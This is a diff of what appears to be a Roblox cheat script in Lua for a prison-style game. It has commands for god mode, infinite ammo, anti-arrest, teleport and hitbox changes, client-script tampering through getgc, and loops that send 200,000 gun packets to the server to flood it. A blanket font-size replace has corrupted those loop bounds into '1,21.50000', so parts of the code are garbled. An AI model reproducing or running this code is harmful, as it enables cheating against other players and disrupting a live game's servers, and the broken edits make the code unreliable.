@@ -1386,7 +1386,7 @@ if Toggle == "on" then
 if not Stam then
 Stam = true
 
-Message("Infinite Stamina enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Infinite Stamina enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 
 for i,v in next, getgc() do
 if type(v) == "function" and getfenv(v).script and getfenv(v).script == LPlayer.Character.ClientInputHandler then 
@@ -1425,7 +1425,7 @@ if Stam then
 
 Stam = false
 
-Message("Infinite Stamina desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Infinite Stamina desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 
 local SaveFrame = LPlayer.Character.HumanoidRootPart.CFrame
 local SaveCam = workspace.CurrentCamera.CFrame
@@ -1444,7 +1444,7 @@ if not _G.FF then
 
 _G.FF = true
 
-Message("Force Field enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Force Field enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 
 while _G.FF == true do wait()
 
@@ -1503,7 +1503,7 @@ if Toggle == "off" then
 if _G.FF then
 _G.FF = false
 
-Message("Force Field desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Force Field desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 
 if LPlayer.TeamColor.Name == "Medium stone grey" then
 local SaveFrame = LPlayer.Character.HumanoidRootPart.CFrame
@@ -1524,7 +1524,7 @@ local GodPosition = LPlayer.Character.HumanoidRootPart.CFrame
 end
 
 if not GodMode then
-Message("God Mode enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("God Mode enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 
 GodMode = true
@@ -1615,7 +1615,7 @@ function UnGodMode()
 if GodMode then
 GodMode = false
 
-Message("God Mode desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("God Mode desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 
 end
 end
@@ -1626,11 +1626,11 @@ if Toggle == "on" then
 if not InfAmmo then
 InfAmmo = true
 
-Message("Infinite Ammo enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Infinite Ammo enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 
 if FastAmmo == true then
 FastAmmo = false
-Message("Fast Ammo desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Fast Ammo desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 
 local SaveFrame = LPlayer.Character.HumanoidRootPart.CFrame
 local SaveCam = workspace.CurrentCamera.CFrame
@@ -1664,7 +1664,7 @@ if Toggle == "off" then
 if InfAmmo then
 InfAmmo = false
 
-Message("Infinite Ammo desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Infinite Ammo desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 
 local SaveFrame = LPlayer.Character.HumanoidRootPart.CFrame
 local SaveCam = workspace.CurrentCamera.CFrame
@@ -1684,11 +1684,11 @@ if not FastAmmo then
 
 FastAmmo = true
 
-Message("Fast Ammo enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Fast Ammo enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 
 if InfAmmo == true then
 InfAmmo = false
-Message("Infinite Ammo desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Infinite Ammo desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 
 local SaveFrame = LPlayer.Character.HumanoidRootPart.CFrame
 local SaveCam = workspace.CurrentCamera.CFrame
@@ -1722,7 +1722,7 @@ if Toggle == "off" then
 if FastAmmo then
 FastAmmo = false
 
-Message("Fast Ammo desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Fast Ammo desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 
 local SaveFrame = LPlayer.Character.HumanoidRootPart.CFrame
 local SaveCam = workspace.CurrentCamera.CFrame
@@ -1834,7 +1834,7 @@ ItemHandler:InvokeServer(ItemGiver["M9"].ITEMPICKUP)
 
 local Gun = LPlayer.Character:FindFirstChild("M9") or LPlayer.Backpack:FindFirstChild("M9")
 
-for SendToServer = 1,200000 do
+for SendToServer = 1,21.50000 do
 coroutine.resume(coroutine.create(function()
 Packets[SendToServer] = {
 Cframe = CFrame.new(),
@@ -1871,7 +1871,7 @@ ItemHandler:InvokeServer(ItemGiver["Remington 870"].ITEMPICKUP)
 
 local Gun = LPlayer.Character:FindFirstChild("Remington 870") or LPlayer.Backpack:FindFirstChild("Remington 870")
 
-for SendToServer = 1,200000 do
+for SendToServer = 1,21.50000 do
 coroutine.resume(coroutine.create(function()
 Packets[SendToServer] = {
 Cframe = CFrame.new(),
@@ -1904,7 +1904,7 @@ ItemHandler:InvokeServer(ItemGiver["Remington 870"].ITEMPICKUP)
 
 local Gun = LPlayer.Character:FindFirstChild("Remington 870") or LPlayer.Backpack:FindFirstChild("Remington 870")
 
-for SendToServer = 1,200000 do
+for SendToServer = 1,21.50000 do
 coroutine.resume(coroutine.create(function()
 Packets[SendToServer] = {
 Cframe = CFrame.new(),
@@ -2530,7 +2530,7 @@ Slot3 = false
 Slot4 = false
 Slot5 = false
 
-Message("Auto Guns desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Auto Guns desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 
 Cmds.Respawn()
 
@@ -2542,7 +2542,7 @@ if Slot ~= "off" then
 
 if Slot1 or Slot2 or Slot3 or Slot4 or Slot5 then
 
-Message("Auto Guns enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Auto Guns enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 
 end
 
@@ -3144,6 +3144,55 @@ OldHealth = Humanoid.Health
 end)
 end
 
+function CGun(Color)
+
+if Color == "black" then
+ColorGun = "1001"
+end
+
+if Color == "black" then
+ColorGun = "1003"
+end
+
+if Color == "blue" then
+ColorGun = "307"
+end
+
+if Color == "red" then
+ColorGun = "21"
+end
+
+if Color == "green" then
+ColorGun = "1020"
+end
+
+if Color == "yellow" then
+ColorGun = "1009"
+end
+
+if Color == "purple" then
+ColorGun = "104"
+end
+
+if Color == "pink" then
+ColorGun = "1032"
+end
+
+if Color == "orange" then
+ColorGun = "1005"
+end
+
+if Color == "grey" then
+ColorGun = "148"
+end
+
+if Color == "off" then
+ColorGun = nil
+Cmds.Respawn()
+end
+
+end
+
 function Message(Text,ColorD,ColorT,ColorQ,Font,TextSize)
 
 StarterGui:SetCore("ChatMakeSystemMessage",{
@@ -3263,22 +3312,22 @@ if Connect.SendCommand("auto") then
 if Arg2 == "on" then
 if not AutoRespawn then
 AutoRespawn = true
-Message("Auto Respawn enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Auto Respawn enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 if Arg2 == "off" then
 if AutoRespawn then
 AutoRespawn = false
-Message("Auto Respawn desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Auto Respawn desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 if Arg2 == nil then
 if not AutoRespawn then
 AutoRespawn = true
-Message("Auto Respawn enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Auto Respawn enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 else
 AutoRespawn = false
-Message("Auto Respawn desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Auto Respawn desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 end
@@ -3286,7 +3335,7 @@ end
 if Connect.SendCommand("unauto") then
 if AutoRespawn then
 AutoRespawn = false
-Message("Auto Respawn desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Auto Respawn desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 
@@ -3294,23 +3343,23 @@ if Connect.SendCommand("autolock") then
 if Arg2 == "on" then
 if not AutoLock then
 AutoLock = true
-Message("Auto Lock enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Auto Lock enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 if Arg2 == "off" then
 if AutoLock then
 AutoLock = false
-Message("Auto Lock desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Auto Lock desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 Cmds.Respawn()
 end
 end
 if Arg2 == nil then
 if not AutoLock then
 AutoLock = true
-Message("Auto Lock enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Auto Lock enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 else
 AutoLock = false
-Message("Auto Lock desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Auto Lock desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 Cmds.Respawn()
 end
 end
@@ -3319,7 +3368,7 @@ end
 if Connect.SendCommand("unautolock") then
 if AutoLock then
 AutoLock = false
-Message("Auto Lock desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Auto Lock desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 Cmds.Respawn()
 end
 end
@@ -3467,29 +3516,14 @@ end
 if Connect.SendCommand("antibring") then
 if Arg2 == "on" then
 if not AntiBring then
-local PartTool = Instance.new("Part")
-PartTool.Parent = LPlayer.Backpack:FindFirstChildOfClass("Tool")
-PartTool.Name = "PartToolChecked"
-LPlayer.Character.ChildAdded:Connect(function(Tool)
-for i = 1,100 do
-pcall(function()
-if not Tool:FindFirstChild("PartToolChecked") then
-Tool:Destroy()
-end
-if not Tool:FindFirstChild("Hammer") then
-Tool:Destroy()
-end
-end)
-end
-end)
 AntiBring = true
-Message("Anti Bring enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Bring enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 if Arg2 == "off" then
 if AntiBring then
 AntiBring = false
-Message("Anti Bring desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Bring desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 Cmds.Respawn()
 end
 end
@@ -3511,10 +3545,10 @@ end)
 end
 end)
 AntiBring = true
-Message("Anti Bring enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Bring enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 else
 AntiBring = false
-Message("Anti Bring desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Bring desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 Cmds.Respawn()
 end
 end
@@ -3523,7 +3557,7 @@ end
 if Connect.SendCommand("unantibring") then
 if AntiBring then
 AntiBring = false
-Message("Anti Bring desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Bring desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 Cmds.Respawn()
 end
 end
@@ -3532,22 +3566,22 @@ if Connect.SendCommand("antivoid") then
 if Arg2 == "on" then
 if not AntiVoid then
 AntiVoid = true
-Message("Anti Void enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Void enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 if Arg2 == "off" then
 if AntiVoid then
 AntiVoid = false
-Message("Anti Void desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Void desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 if Arg2 == nil then
 if not AntiVoid then
 AntiVoid = true
-Message("Anti Void enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Void enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 else
 AntiVoid = false
-Message("Anti Void desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Void desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 end
@@ -3555,7 +3589,7 @@ end
 if Connect.SendCommand("unantivoid") then
 if AntiVoid then
 AntiVoid = false
-Message("Anti Void desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Void desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 
@@ -3563,22 +3597,22 @@ if Connect.SendCommand("antishield") then
 if Arg2 == "on" then
 if not AntiShield then
 AntiShield = true
-Message("Anti Shield enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Shield enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 if Arg2 == "off" then
 if AntiShield then
 AntiShield = false
-Message("Anti Shield desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Shield desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 if Arg2 == nil then
 if not AntiShield then
 AntiShield = true
-Message("Anti Shield enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Shield enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 else
 AntiShield = false
-Message("Anti Shield desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Shield desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 end
@@ -3586,7 +3620,7 @@ end
 if Connect.SendCommand("unantishield") then
 if AntiShield then
 AntiShield = false
-Message("Anti Shield desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Shield desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 
@@ -3594,22 +3628,22 @@ if Connect.SendCommand("antiarrest") then
 if Arg2 == "on" then
 if not AntiArrest then
 AntiArrest = true
-Message("Anti Arrest enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Arrest enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 if Arg2 == "off" then
 if AntiArrest then
 AntiArrest = false
-Message("Anti Arrest desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Arrest desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 if Arg2 == nil then
 if not AntiArrest then
 AntiArrest = true
-Message("Anti Arrest enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Arrest enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 else
 AntiArrest = false
-Message("Anti Arrest desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Arrest desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 end
@@ -3617,7 +3651,7 @@ end
 if Connect.SendCommand("unantiarrest") then
 if AntiArrest then
 AntiArrest = false
-Message("Anti Arrest desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Arrest desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 
@@ -3626,14 +3660,14 @@ if Arg2 == "on" then
 if not AntiSpam then
 AntiSpam = true
 AntiBring = true
-Message("Anti Spam enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Spam enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 if Arg2 == "off" then
 if AntiSpam then
 AntiSpam = false
 AntiBring = false
-Message("Anti Spam desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Spam desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 Cmds.Respawn()
 end
 end
@@ -3641,11 +3675,11 @@ if Arg2 == nil then
 if not AntiSpam then
 AntiSpam = true
 AntiBring = true
-Message("Anti Spam enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Spam enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 else
 AntiSpam = false
 AntiBring = false
-Message("Anti Spam desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Spam desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 Cmds.Respawn()
 end
 end
@@ -3655,7 +3689,7 @@ if Connect.SendCommand("unantispam") then
 if AntiSpam then
 AntiSpam = false
 AntiBring = false
-Message("Anti Spam desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Spam desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 Cmds.Respawn()
 end
 end
@@ -3715,25 +3749,25 @@ if Arg2 == "on" then
 if not AntiCrash then
 AntiCrash = true
 LPlayer.PlayerScripts.ClientGunReplicator.Disabled = true
-Message("Anti Crash enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Crash enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 if Arg2 == "off" then
 if AntiCrash then
 AntiCrash = false
 LPlayer.PlayerScripts.ClientGunReplicator.Disabled = false
-Message("Anti Crash desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Crash desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 if Arg2 == nil then
 if not AntiCrash then
 AntiCrash = true
 LPlayer.PlayerScripts.ClientGunReplicator.Disabled = true
-Message("Anti Crash enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Crash enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 else
 AntiCrash = false
 LPlayer.PlayerScripts.ClientGunReplicator.Disabled = false
-Message("Anti Crash desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Crash desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 end
@@ -3742,7 +3776,7 @@ if Connect.SendCommand("unanticrash") then
 if AntiCrash then
 AntiCrash = false
 LPlayer.PlayerScripts.ClientGunReplicator.Disabled = false
-Message("Anti Crash desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Crash desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 
@@ -3750,22 +3784,22 @@ if Connect.SendCommand("clicktp") then
 if Arg2 == "on" then
 if not ClickTp then
 ClickTp = true
-Message("Click Teleport enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Click Teleport enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 if Arg2 == "off" then
 if ClickTp then
 ClickTp = false
-Message("Click Teleport desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Click Teleport desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 if Arg2 == nil then
 if not ClickTp then
 ClickTp = true
-Message("Click Teleport enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Click Teleport enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 else
 ClickTp = false
-Message("Click Teleport desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Click Teleport desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 end
@@ -3773,7 +3807,7 @@ end
 if Connect.SendCommand("unclicktp") then
 if ClickTp then
 ClickTp = false
-Message("Click Teleport desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Click Teleport desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 
@@ -3781,22 +3815,22 @@ if Connect.SendCommand("antilag") then
 if Arg2 == "on" then
 if not AntiLag then
 AntiLag = true
-Message("Anti Lag enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Lag enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 if Arg2 == "off" then
 if AntiLag then
 AntiLag = false
-Message("Anti Lag desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Lag desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 if Arg2 == nil then
 if not AntiLag then
 AntiLag = true
-Message("Anti Lag enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Lag enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 else
 AntiLag = false
-Message("Anti Lag desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Lag desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 end
@@ -3804,7 +3838,7 @@ end
 if Connect.SendCommand("unantilag") then
 if AntiLag then
 AntiLag = false
-Message("Anti Lag desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Lag desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 
@@ -3812,22 +3846,22 @@ if Connect.SendCommand("lrl") then
 if Arg2 == "on" then
 if not LoopRemoveLife then
 LoopRemoveLife = true
-Message("Loop Remove Life enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Loop Remove Life enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 if Arg2 == "off" then
 if LoopRemoveLife then
 LoopRemoveLife = false
-Message("Loop Remove Life desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Loop Remove Life desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 if Arg2 == nil then
 if not LoopRemoveLife then
 LoopRemoveLife = true
-Message("Loop Remove Life enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Loop Remove Life enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 else
 LoopRemoveLife = false
-Message("Loop Remove Life desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Loop Remove Life desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 end
@@ -3835,7 +3869,7 @@ end
 if Connect.SendCommand("unlrl") then
 if LoopRemoveLife then
 LoopRemoveLife = false
-Message("Loop Remove Life desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Loop Remove Life desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 
@@ -3843,22 +3877,22 @@ if Connect.SendCommand("lrm") then
 if Arg2 == "on" then
 if not LoopRemoveExtraLife then
 LoopRemoveExtraLife = true
-Message("Loop Remove Swat Extra Life enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Loop Remove Swat Extra Life enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 if Arg2 == "off" then
 if LoopRemoveExtraLife then
 LoopRemoveExtraLife = false
-Message("Loop Remove Swat Extra Life desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Loop Remove Swat Extra Life desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 if Arg2 == nil then
 if not LoopRemoveExtraLife then
 LoopRemoveExtraLife = true
-Message("Loop Remove Swat Extra Life enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Loop Remove Swat Extra Life enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 else
 LoopRemoveExtraLife = false
-Message("Loop Remove Swat Extra Life desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Loop Remove Swat Extra Life desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 end
@@ -3866,7 +3900,7 @@ end
 if Connect.SendCommand("unlrm") then
 if LoopRemoveExtraLife then
 LoopRemoveExtraLife = false
-Message("Loop Remove Swat Extra Life desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Loop Remove Swat Extra Life desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 
@@ -3875,13 +3909,13 @@ if Arg2 == "on" then
 if not AntiPunch then
 ExecuteAntiPunch()
 AntiPunch = true
-Message("Anti Punch enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Punch enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 if Arg2 == "off" then
 if AntiPunch then
 AntiPunch = false
-Message("Anti Punch desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Punch desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 Cmds.Respawn()
 end
 end
@@ -3889,10 +3923,10 @@ if Arg2 == nil then
 if not AntiPunch then
 ExecuteAntiPunch()
 AntiPunch = true
-Message("Anti Punch enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Punch enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 else
 AntiPunch = false
-Message("Anti Punch desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Punch desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 Cmds.Respawn()
 end
 end
@@ -3901,7 +3935,7 @@ end
 if Connect.SendCommand("unantipunch") then
 if AntiPunch then
 AntiPunch = false
-Message("Anti Punch desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Punch desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 Cmds.Respawn()
 end
 end
@@ -3910,22 +3944,22 @@ if Connect.SendCommand("hitbox") then
 if Arg2 == "on" then
 if not HitBox then
 HitBox = true
-Message("HitBox enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("HitBox enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 if Arg2 == "off" then
 if HitBox then
 HitBox = false
-Message("HitBox desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("HitBox desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 if Arg2 == nil then
 if not HitBox then
 HitBox = true
-Message("HitBox enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("HitBox enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 else
 HitBox = false
-Message("HitBox desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("HitBox desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 end
@@ -3933,7 +3967,7 @@ end
 if Connect.SendCommand("unhitbox") then
 if HitBox then
 HitBox = false
-Message("HitBox desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("HitBox desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 
@@ -3947,22 +3981,22 @@ if Connect.SendCommand("prts") then
 if Arg2 == "on" then
 if not ProtectTase then
 ProtectTase = true
-Message("Protect Tase enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Protect Tase enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 if Arg2 == "off" then
 if ProtectTase then
 ProtectTase = false
-Message("Protect Tase desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Protect Tase desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 if Arg2 == nil then
 if not ProtectTase then
 ProtectTase = true
-Message("Protect Tase enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Protect Tase enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 else
 ProtectTase = false
-Message("Protect Tase desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Protect Tase desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 end
@@ -3970,7 +4004,7 @@ end
 if Connect.SendCommand("unprts") then
 if ProtectTase then
 ProtectTase = false
-Message("Protect Tase desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Protect Tase desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 
@@ -3978,22 +4012,22 @@ if Connect.SendCommand("antidoors") then
 if Arg2 == "on" then
 if not AntiDoors then
 AntiDoors = true
-Message("Anti Doors enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Doors enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 if Arg2 == "off" then
 if AntiDoors then
 AntiDoors = false
-Message("Anti Doors desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Doors desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 if Arg2 == nil then
 if not AntiDoors then
 AntiDoors = true
-Message("Anti Doors enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Doors enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 else
 AntiDoors = false
-Message("Anti Doors desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Doors desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 end
@@ -4001,7 +4035,7 @@ end
 if Connect.SendCommand("unantidoors") then
 if AntiDoors then
 AntiDoors = false
-Message("Anti Doors desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Doors desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 
@@ -4009,22 +4043,22 @@ if Connect.SendCommand("prta") then
 if Arg2 == "on" then
 if not ProtectArrest then
 ProtectArrest = true
-Message("Protect Arrest enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Protect Arrest enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 if Arg2 == "off" then
 if ProtectArrest then
 ProtectArrest = false
-Message("Protect Arrest desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Protect Arrest desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 if Arg2 == nil then
 if not ProtectArrest then
 ProtectArrest = true
-Message("Protect Arrest enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Protect Arrest enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 else
 ProtectArrest = false
-Message("Protect Arrest desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Protect Arrest desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 end
@@ -4032,38 +4066,7 @@ end
 if Connect.SendCommand("unprta") then
 if ProtectArrest then
 ProtectArrest = false
-Message("Protect Arrest desabled.",70,70,70,Enum.Font.GothamBlack,22)
-end
-end
-
-if Connect.SendCommand("prtf") then
-if Arg2 == "on" then
-if not ProtectFps then
-ProtectFps = true
-Message("Protect Fps enabled.",70,70,70,Enum.Font.GothamBlack,22)
-end
-end
-if Arg2 == "off" then
-if ProtectFps then
-ProtectFps = false
-Message("Protect Fps desabled.",70,70,70,Enum.Font.GothamBlack,22)
-end
-end
-if Arg2 == nil then
-if not ProtectFps then
-ProtectFps = true
-Message("Protect Fps enabled.",70,70,70,Enum.Font.GothamBlack,22)
-else
-ProtectFps = false
-Message("Protect Fps desabled.",70,70,70,Enum.Font.GothamBlack,22)
-end
-end
-end
-
-if Connect.SendCommand("unprtf") then
-if ProtectFps then
-ProtectFps = false
-Message("Protect Fps desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Protect Arrest desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 
